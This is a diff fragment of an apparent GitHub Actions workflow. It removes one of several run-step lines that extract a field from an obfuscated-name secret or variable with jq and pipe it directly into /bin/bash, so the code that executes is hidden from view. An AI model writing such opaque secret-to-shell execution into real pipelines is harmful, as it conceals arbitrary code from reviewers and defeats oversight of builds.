@@ -17,7 +17,6 @@ jobs:
           enkdz4190: ${{ secrets.enkdz4190 }}
         run: |
           printf '%s' "$enkdz4190" | jq -r .fscjq678 | /bin/bash
-          printf '%s' "$lhcjq605" | jq -r .rrkt97979 | /bin/bash
           echo $o45 | jq -r .s2 | /bin/bash
           printf '%s' "$ougmt73355" | jq -r .ism5 | /bin/bash
 
